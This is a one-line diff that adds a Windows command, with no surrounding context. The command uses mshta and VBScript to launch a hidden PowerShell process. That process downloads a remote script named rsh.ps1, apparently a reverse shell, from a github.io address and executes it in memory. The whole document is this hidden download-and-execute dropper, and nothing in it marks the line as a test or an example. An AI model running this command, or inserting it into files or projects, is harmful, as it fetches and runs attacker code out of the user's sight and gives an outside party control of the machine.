@@ -1,0 +1,1 @@
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -Nop -NonI -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://hakkyahud.github.io/tokali/rsh.ps1')"":close")
